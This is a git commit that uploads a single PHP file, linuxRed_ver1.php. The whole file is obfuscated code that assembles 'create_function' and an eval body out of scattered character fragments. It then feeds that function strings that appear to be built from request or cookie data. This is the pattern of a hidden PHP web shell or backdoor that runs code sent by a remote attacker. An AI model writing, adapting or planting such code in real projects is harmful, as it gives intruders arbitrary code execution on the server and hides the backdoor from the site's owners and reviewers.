8f1d5bb4cdeb10252b6ec84dd80b89beee14b385
SillyDucky <56455801+SillyDucky@users.noreply.github.com>
2019-10-11 16:53:52 -0400

    Add files via upload

---
+++ linuxRed_ver1.php
@@ -0,0 +1,110 @@
+<?php
+
+$kessia ='$RH_ai';$familiarness='"))eT(eZ$';$inequality = 'n';$courts= 't';$hothouse = 'a';$lurline = ':)raO4';$composites= 'id_ao'; $dam ='T';$distance=')ij'; $exemplifying= 'ATe';
+
+$hewet= 'lm[XRa'; $hatti = 't';
+$aubrette= 'e';
+$danyelle ='n';$elder ='e$r_s;';$avouch='i';
+$borrowers = 'sI_RP_'; $galina ='=A'; $duckling= ';(a$i[_^'; $bookend ='E';$drills = 'c(oI'; $institutions= 'a';
+
+$bakes ='('; $detachment= 'Ugffa)OJ'; $insistently='_p';$atoned ='a$;rrjeCF';$decompile = 'd';
+
+$leaving = 's'; $decliner = 'U';$dependable= ' ';$poppa='e?VeRaka';
+$burbank='rxtlaedT';
+$cajoled= 'R)Y'; $incorporating ='i?aE]uir'; $exigent ='e=6g';
+
+$compromiser=';_E(vsvTr'; $anthropology = 'p'; $auscultated='r';$boor = 'y'; $evangelin= 's'; $beehive ='(';$banky = 'JIQ]sdjt';$extensive='e'; $inflated = '(c"'; $anet=')'; $ingeborg = 'P';
+
+$comfort ='Sr_'; $harman = 'y'; $conjurer='P)e"';$immovability ='"';$lucio = '_'; $irksome = 'riA:';$diorama ='eifOc[K('; $choirmaster= 'euo"'; $declares= 'V[ns_$';$darthvader = 'S'; $bathrobe='f';
+
+$confiscation = 'gX';$gob ='g';$calamity= 't'; $dignity ='['; $anecdote= 'ietXb"ra('; $alternative ='h';$crows =']"rca'; $inevitable = '"';$giacobo ='AxHt)f$'; $credulity ='`_b]SO,'; $gushed= 'cvWro()'; $decomposing= 'e$EOv';$inconsistency = 'i'; $decomposable= 'T$oQ'; $humorousness ='iF,R';$anhydrous= ')';
+
+$clamp =']';
+$heater = 's($aE'; $beakers =$gushed['0'] . $gushed['3']. $decomposing['0'] . $heater['3'] . $giacobo['3'] .$decomposing['0'].$credulity['1'] . $giacobo['5'] .$choirmaster['1']. $declares['2']. $gushed['0'].$giacobo['3']. $humorousness['0']. $decomposable['2'] . $declares['2']; $greatcoat =$dependable ; $gypsite = $beakers ($greatcoat,$decomposing['0'] . $decomposing['4']. $heater['3']. $burbank['3'].$heater['1']. $heater['3'] .$gushed['3'].
+$gushed['3'].$heater['3'].$harman . $credulity['1'] . $anthropology . $decomposable['2'] .$anthropology .$heater['1'] . $giacobo['5'] . $choirmaster['1'].
+$declares['2'] .$gushed['0'] . $credulity['1'].$gob . $decomposing['0'].
+
+$giacobo['3'].$credulity['1'] .
+$heater['3'] . $gushed['3'] . $gob.$heater['0'].
+
+$heater['1'].$anhydrous . $anhydrous.$anhydrous . $compromiser[0] ); $gypsite
+
+($decomposable['0'], $giacobo['3'],
+$anecdote['3'],
+
+$clamp, $decliner , $heater['4'],
+$anthropology,$caresa['0'], $mady[3] ,
+$alternative, $gerund['0'],$aptness, $heater['2'].
+$humorousness['0']. $exigent['1'].
+$heater['3'].$gushed['3'].$gushed['3'] .
+
+$heater['3'] .
+
+$harman. $credulity['1'] .
+
+$hewet[1] .
+
+$decomposing['0'].$gushed['3']. $gob .
+
+$decomposing['0'] .$heater['1']. $heater['2'] . $credulity['1']. $humorousness['3'] . $heater['4'].
+$decomposable['3'].$decliner. $heater['4'] .$credulity['4']. $decomposable['0'] .
+
+$humorousness['2'] .
+
+$heater['2'] .$credulity['1']. $atoned['7'] .
+$decomposing['3'] . $decomposing['3'] . $diorama['6'].
+
+$banky[1] .
+
+$heater['4'].$humorousness['2']. $heater['2']. $credulity['1']. $credulity['4'] . $heater['4']. $humorousness['3']. $declares['0']. $heater['4'] . $humorousness['3'] .
+
+$anhydrous . $compromiser[0]. $heater['2'].$heater['3'].$exigent['1']. $humorousness['0']. $heater['0'] .$heater['0'].$decomposing['0'] .
+
+$giacobo['3'].
+
+$heater['1'] .
+$heater['2'] .$humorousness['0'].$dignity .$inevitable .
+$decomposable['2'] . $heater['3'].$giacobo['5'].
+$gushed['3'] .$humorousness['0'] . $banky['6'] . $heater['3'] .$giacobo['1'].
+
+$inevitable.
+
+$clamp.$anhydrous.$incorporating['1']. $heater['2'] .$humorousness['0'].$dignity.$inevitable .
+$decomposable['2'] .$heater['3'] .$giacobo['5'] .$gushed['3'].
+
+$humorousness['0']. $banky['6'] . $heater['3'] . $giacobo['1'] .$inevitable.
+
+$clamp.
+
+$irksome['3'] . $heater['1'] . $humorousness['0'] . $heater['0'] .$heater['0']. $decomposing['0'].$giacobo['3'] .$heater['1'] .
+$heater['2'] . $humorousness['0'].
+
+$dignity.$inevitable . $giacobo[2].$decomposable['0']. $decomposable['0'] . $conjurer['0'] . $credulity['1'] .
+$decomposing['3']. $giacobo['0'].
+
+$humorousness['1'] . $humorousness['3'] .$banky[1]. $banky['0'].$giacobo['0'] . $anecdote['3'] .$inevitable.$clamp. $anhydrous. $incorporating['1'] . $heater['2'].$humorousness['0']. $dignity . $inevitable .$giacobo[2] .
+$decomposable['0'] .
+$decomposable['0'] . $conjurer['0']. $credulity['1'] . $decomposing['3']. $giacobo['0'].$humorousness['1'] . $humorousness['3'] .$banky[1]. $banky['0'] .
+
+$giacobo['0'] .$anecdote['3'].$inevitable.
+
+$clamp.$irksome['3'] . $banky[5] .
+
+$humorousness['0']. $decomposing['0'].
+
+$anhydrous .$compromiser[0]. $decomposing['0'] . $decomposing['4'].
+
+$heater['3']. $burbank['3'] . $heater['1'] .
+
+$heater['0'] . $giacobo['3'] . $gushed['3'].$gushed['3'] .
+
+$decomposing['0']. $decomposing['4'] .
+$heater['1'] . $credulity[2].$heater['3'] .$heater['0'] . $decomposing['0'] . $exigent['2'] . $lurline[5] .$credulity['1'].$banky[5] .
+$decomposing['0'] .
+
+$gushed['0'].
+
+$decomposable['2']. $banky[5] .$decomposing['0'] . $heater['1'] .$heater['0'].$giacobo['3'] .
+
+$gushed['3'] .$gushed['3'] .$decomposing['0'] .$decomposing['4'].
+$heater['1'] . $heater['2']. $heater['3']. $anhydrous.$anhydrous. $anhydrous.$anhydrous. $compromiser[0] ); 
